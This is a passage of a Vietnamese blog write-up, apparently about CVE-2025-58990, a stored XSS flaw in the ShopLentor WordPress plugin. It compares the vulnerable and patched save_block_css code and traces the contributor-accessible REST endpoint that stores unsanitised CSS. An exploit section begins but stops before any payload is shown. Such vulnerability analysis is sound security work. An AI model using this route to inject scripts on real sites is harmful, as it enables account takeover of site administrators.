1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;ShopLentor&lt;/strong&gt;: v3.2.0(vul) v√† v3.2.1(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Actived WooCommerce plugin&lt;/strong&gt;: plugin b·∫Øt bu·ªôc &lt;strong&gt;actived&lt;/strong&gt; tr∆∞·ªõc khi c√†i &lt;strong&gt;ShopLentor Plugin&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file &lt;strong&gt;woolentor-blocks/includes/classes/Manage_Styles.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    $params &#x9;= $request-&amp;gt;get_params();&#xA;    $post_id = sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;&#xA;    // Kh√¥ng ki·ªÉm tra quy·ªÅn user&#xA;    // Kh√¥ng l·ªçc n·ªôi dung CSS tr∆∞·ªõc khi l∆∞u&#xA;    update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $params[&amp;#39;block_css&amp;#39;] );&#xA;    $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $params[&amp;#39;block_css&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    $params &#x9;= $request-&amp;gt;get_params();&#xA;    $post_id = sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;&#xA;    // Ch·ªâ admin ho·∫∑c t√°c gi·∫£ b√†i vi·∫øt m·ªõi ƒë∆∞·ª£c ph√©p&#xA;    $post = get_post( $post_id );&#xA;    if ( ! $post || ( ! current_user_can(&amp;#39;manage_options&amp;#39;) &amp;amp;&amp;amp;&#xA;        get_current_user_id() !== (int) $post-&amp;gt;post_author ) ) {&#xA;        return [&amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;No permission&amp;#39;)];&#xA;    }&#xA;&#xA;    // L·ªçc d·ªØ li·ªáu tr∆∞·ªõc khi l∆∞u&#xA;    $block_css = $this-&amp;gt;sanitize_css_content( $params[&amp;#39;block_css&amp;#39;] );&#xA;    update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $block_css );&#xA;    $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $block_css );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° d√πng &lt;code&gt;current_user_can(manage_options)&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra c√≥ ph·∫£i &lt;strong&gt;admin&lt;/strong&gt; kh√¥ng&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu user l√† &lt;strong&gt;admin&lt;/strong&gt; =&amp;gt; v·∫ø ƒë·∫ßu &lt;code&gt;! current_user_can(&#39;manage_options&#39;) = false&lt;/code&gt; =&amp;gt; c·∫£ bi·ªÉu th·ª©c &lt;code&gt;&amp;amp;&amp;amp; = false&lt;/code&gt; =&amp;gt; qua ƒë∆∞·ª£c.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu user l√† &lt;strong&gt;author&lt;/strong&gt; =&amp;gt; v·∫ø sau &lt;code&gt;get_current_user_id() !== (int) $post-&amp;gt;post_author = false&lt;/code&gt; =&amp;gt; c·∫£ bi·ªÉu th·ª©c &lt;code&gt;&amp;amp;&amp;amp; = false&lt;/code&gt; =&amp;gt; qua ƒë∆∞·ª£c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/patch_diff.png&#34;&#xA;    alt=&#34;Patch Diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch Diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How It Work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    try{&#xA;        global $wp_filesystem;&#xA;        if ( ! $wp_filesystem || !function_exists(&amp;#39;WP_Filesystem&amp;#39;) ) {&#xA;            require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;        }&#xA;&#xA;        $params &#x9;= $request-&amp;gt;get_params();&#xA;        $post_id &#x9;= sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;        &#xA;        if ( $post_id == &amp;#39;woolentor-widget&amp;#39; &amp;amp;&amp;amp; $params[&amp;#39;has_block&amp;#39;] ) {&#xA;            update_option( $post_id, $params[&amp;#39;block_css&amp;#39;] );&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true, &#xA;                &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Widget CSS Saved.&amp;#39;, &amp;#39;woolentor&amp;#39;)&#xA;            ];&#xA;        }&#xA;&#xA;        $filename &#x9;&#x9;= &amp;#34;woolentor-css-{$post_id}.css&amp;#34;;&#xA;        $upload_dir_url = wp_upload_dir();&#xA;        $dirname &#x9;&#x9;= trailingslashit( $upload_dir_url[&amp;#39;basedir&amp;#39;] ) . &amp;#39;woolentor-addons/&amp;#39;;&#xA;&#xA;        if ( $params[&amp;#39;has_block&amp;#39;] ) {&#xA;            update_post_meta( $post_id, &amp;#39;_woolentor_active&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;            $all_block_css = $params[&amp;#39;block_css&amp;#39;];&#xA;&#xA;            WP_Filesystem( false, $upload_dir_url[&amp;#39;basedir&amp;#39;], true );&#xA;            if( ! $wp_filesystem-&amp;gt;is_dir( $dirname ) ) {&#xA;                $wp_filesystem-&amp;gt;mkdir( $dirname );&#xA;            }&#xA;&#xA;            update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $all_block_css );&#xA;            if ( ! $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $all_block_css ) ) {&#xA;                throw new \Exception( __(&amp;#39;You are not permitted to save CSS.&amp;#39;, &amp;#39;woolentor&amp;#39; ) ); &#xA;            }&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;                &amp;#39;message&amp;#39; =&amp;gt;__(&amp;#39;WooLentor Blocks css file update.&amp;#39;, &amp;#39;woolentor&amp;#39; )&#xA;            ];&#xA;        } else {&#xA;            delete_post_meta( $post_id, &amp;#39;_woolentor_active&amp;#39; );&#xA;            if ( file_exists( $dirname.$filename ) ) {&#xA;                wp_delete_file( $dirname.$filename );&#xA;            }&#xA;            delete_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39; );&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;WooLentor Blocks CSS Delete.&amp;#39;, &amp;#39;woolentor&amp;#39; )&#xA;            ];&#xA;        }&#xA;    } catch( \Exception $e ){&#xA;        return [&#xA;            &amp;#39;success&amp;#39; =&amp;gt; false,&#xA;            &amp;#39;message&amp;#39; =&amp;gt; $e-&amp;gt;getMessage()&#xA;        ];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;save_block_css()&lt;/code&gt; thu·ªôc class &lt;code&gt;Manage_Styles&lt;/code&gt; c√≥ nhi·ªám v·ª• l∆∞u ho·∫∑c x√≥a CSS tu·ª≥ theo block.&lt;/p&gt;&#xA;&lt;p&gt;·ª®ng d·ª•ng s·∫Ω l·∫•y &lt;code&gt;post_id&lt;/code&gt; v√† n·ªôi dung &lt;code&gt;block_css&lt;/code&gt; t·ª´ request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát&lt;/strong&gt;: n·∫øu &lt;code&gt;post_id = woolentor-widget&lt;/code&gt; =&amp;gt; l∆∞u CSS v√†o &lt;code&gt;wp_options&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Tr∆∞·ªùng h·ª£p b√†i vi·∫øt th∆∞·ªùng&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu c√≥ block (&lt;code&gt;has_block = true&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê√°nh d·∫•u post ƒëang active (&lt;code&gt;_woolentor_active&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;L∆∞u CSS v√†o b·∫£ng &lt;code&gt;wp_postmeta&lt;/code&gt; v·ªõi &lt;code&gt;meta_key&lt;/code&gt; l√† &lt;code&gt;_woolentor_css&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_postmeta where meta_key=&amp;#39;_woolentor_css&amp;#39;;&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&#xA;| meta_id | post_id | meta_key       | meta_value |&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&#xA;|      27 |      69 | _woolentor_css | body:{}    |&#xA;|     687 |    1416 | _woolentor_css | body:{}    |&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Ghi CSS ra file trong th∆∞ m·ª•c upload (&lt;code&gt;woolentor-css-{post_id}.css&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/write_css.png&#34;&#xA;      alt=&#34;Write CSS&#34;&gt;&lt;figcaption&gt;&#xA;        &lt;p&gt;Write CSS&lt;/p&gt;&#xA;      &lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu kh√¥ng c√≥ block (&lt;code&gt;has_block = false&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Xo√° tr·∫°ng th√°i active v√† CSS meta.&lt;/li&gt;&#xA;&lt;li&gt;Xo√° file CSS n·∫øu t·ªìn t·∫°i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ Kh·∫£ nƒÉng x·∫£y ra l√† combo &lt;strong&gt;Stored XSS&lt;/strong&gt; ph·ªï bi·∫øn trong plugin WordPress: user role &lt;strong&gt;contributor&lt;/strong&gt; (kh√¥ng c√≥ quy·ªÅn publish) t·∫°o post c√≥ CSS ch·ª©a payload XSS. Payload n√†y ƒë∆∞·ª£c l∆∞u trong &lt;strong&gt;database&lt;/strong&gt; ho·∫∑c m·ªôt &lt;strong&gt;file&lt;/strong&gt;; Ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn cao h∆°n s·∫Ω preview (xem tr∆∞·ªõc) n·ªôi dung tr∆∞·ªõc khi publish, payload s·∫Ω ƒë∆∞·ª£c t·∫£i/hi·ªÉn th·ªã trong tr√¨nh duy·ªát v√† th·ª±c thi, g√¢y ra XSS.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ hi·ªÉu c√°ch d·ªØ li·ªáu ƒë∆∞·ª£c hi·ªÉn th·ªã, ta t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;_woolentor_css&lt;/code&gt; trong th∆∞ m·ª•c plugin. V√¨ CSS ƒë∆∞·ª£c l∆∞u trong &lt;code&gt;wp_postmeta&lt;/code&gt; v·ªõi &lt;code&gt;meta_key = _woolentor_css&lt;/code&gt;, n√™n ch·∫Øc ch·∫Øn plugin s·∫Ω truy v·∫•n gi√° tr·ªã n√†y v√† ch√®n tr·ª±c ti·∫øp v√†o HTML.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/meta_key.png&#34;&#xA;    alt=&#34;Search Meta Key&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search Meta Key&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;generate_inline_css()&lt;/code&gt; l·∫•y block CSS t·ª´ &lt;strong&gt;wp_postmeta&lt;/strong&gt; v·ªõi &lt;code&gt;meta_key = _woolentor_css&lt;/code&gt; v√† l·∫•y t·ª´ file &lt;code&gt;woolentor-css-{$post_id}.css&lt;/code&gt;, n·∫øu file t·ªìn t·∫°i th√¨ &lt;code&gt;get_contents&lt;/code&gt; v√† inline CSS cho post c√≥ &lt;code&gt;$post_id&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn v√†o, c√≤n n·∫øu file kh√¥ng t·ªìn t·∫°i th√¨ l·∫•y t·ª´ &lt;strong&gt;wp_postmeta&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;N·ªôi dung ƒë∆∞·ª£c ƒë·∫∑t trong th·∫ª &lt;code&gt;&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;class &lt;code&gt;Manage_Styles&lt;/code&gt; ƒëƒÉng k√Ω &lt;strong&gt;REST API&lt;/strong&gt; trong h√†m &lt;code&gt;register_routes&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes( $namespace ){&#xA;    register_rest_route( $namespace, &amp;#39;save_css&amp;#39;,&#xA;        [&#xA;            [&#xA;                &amp;#39;methods&amp;#39;  =&amp;gt; &amp;#39;POST&amp;#39;, &#xA;                &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;save_block_css&amp;#39; ],&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;permission_check&amp;#39; ],&#xA;                &amp;#39;args&amp;#39; =&amp;gt; []&#xA;            ]&#xA;        ]&#xA;    );&#xA;    // other route&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;register_rest_route()&lt;/code&gt; t·∫°o m·ªôt &lt;strong&gt;REST API&lt;/strong&gt; endpoint t·∫°i ƒë∆∞·ªùng d·∫´n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/{namespace}/save_css&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi c√≥ request &lt;strong&gt;POST&lt;/strong&gt; t·ªõi endpoint n√†y:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;WordPress s·∫Ω g·ªçi h√†m &lt;code&gt;save_block_css()&lt;/code&gt; ƒë·ªÉ x·ª≠ l√Ω d·ªØ li·ªáu.&lt;/li&gt;&#xA;&lt;li&gt;Tr∆∞·ªõc ƒë√≥, &lt;code&gt;permission_callback&lt;/code&gt; s·∫Ω ch·∫°y h√†m &lt;code&gt;permission_check()&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user (n·∫øu tr·∫£ v·ªÅ false th√¨ ch·∫∑n request).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function permission_check() {&#xA;    if( current_user_can( &amp;#39;edit_posts&amp;#39; ) ){&#xA;        return true;&#xA;    }else{&#xA;        return false;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;permission_check&lt;/code&gt; quy ƒë·ªãnh r·∫±ng ch·ªâ nh·ªØng user c√≥ quy·ªÅn &lt;strong&gt;contributor&lt;/strong&gt; tr·ªü l√™n m·ªõi ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng API n√†y.&lt;/p&gt;&#xA;&lt;p&gt;Ta ch∆∞a x√°c ƒë·ªãnh ƒë∆∞·ª£c ch√≠nh x√°c &lt;strong&gt;namespace&lt;/strong&gt; ·ªü ƒë√¢y l√† g√¨ v√¨ n√≥ ƒë∆∞·ª£c khai b√°o ·ªü ƒë√¢u ƒë√≥ trong m√£ ngu·ªìn, kh√¥ng ph·∫£i trong class n√†y. Ta t·∫≠n d·ª•ng route &lt;code&gt;save_css&lt;/code&gt; ƒë·ªÉ truy v·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;Truy c·∫≠p &lt;code&gt;/wp-json/&lt;/code&gt; v√† t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;save_css&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/search.png&#34;&#xA;    alt=&#34;Search&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;K·∫øt qu·∫£ cho th·∫•y endpoint th·ª±c t·∫ø l√†:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·ªÉ bi·∫øt &lt;strong&gt;namespace&lt;/strong&gt; n√†y ƒë∆∞·ª£c khai b√°o ·ªü ƒë√¢u, ta ti·∫øp t·ª•c t√¨m trong m√£ ngu·ªìn v·ªõi t·ª´ kh√≥a &lt;code&gt;&#39;woolentor/v1&#39;&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/name_space.png&#34;&#xA;    alt=&#34;Name Space&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Name Space&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;C√≥ nhi·ªÅu k·∫øt qu·∫£, nh∆∞ng v√¨ ta ƒëang ph√¢n t√≠ch t√≠nh nƒÉng &lt;strong&gt;REST API&lt;/strong&gt;, n√™n t·∫≠p trung v√†o file &lt;strong&gt;Api.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;register_routes( $namespace )&lt;/code&gt; thu·ªôc class &lt;code&gt;Manage_Styles&lt;/code&gt; y√™u c·∫ßu tham s·ªë &lt;code&gt;$namespace&lt;/code&gt; n√™n c√≥ th·ªÉ &lt;code&gt;woolentor/v1&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn ·ªü ƒë√¢y th√¥ng qua th·ªÉ hi·ªán c·ªßa class g·ªçi ƒë·∫øn h√†m. ta t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;Manage_Styles&lt;/code&gt; trong file &lt;strong&gt;Api.php&lt;/strong&gt; ƒë·ªÉ bi·∫øt n√≥ ƒë∆∞·ª£c g·ªçi nh∆∞ v·∫≠y kh√¥ng.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/callapi.png&#34;&#xA;    alt=&#34;Call Api&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Call Api&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;namespace&lt;/code&gt; ch√≠nh x√°c ƒë∆∞·ª£c g·ªçi v√† truy·ªÅn nh∆∞ v·∫≠y.&lt;/p&gt;&#xA;&lt;p&gt;üëâ Nh∆∞ v·∫≠y, khi g·ª≠i &lt;strong&gt;POST&lt;/strong&gt; request ƒë·∫øn endpoint &lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt;, callback &lt;code&gt;save_block_css&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ th√™m/s·ª≠a block CSS trong file v√† database.&#xA;Khi truy c·∫≠p v√†o post c√≥ &lt;code&gt;post_id&lt;/code&gt; li√™n quan ƒë·∫øn block CSS ƒë∆∞·ª£c l∆∞u, &lt;code&gt;generate_inline_css&lt;/code&gt; s·∫Ω l·∫•y n·ªôi block CSS v√† inline CSS trong th·∫ª &lt;code&gt;&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt; c·ªßa post.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;S·ª≠ d·ª•ng user c√≥ role &lt;strong&gt;contributor&lt;/strong&gt; t·∫°o 1 post b·∫•t k√¨, ghi nh·ªõ id c·ªßa post ƒë√≥.&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i 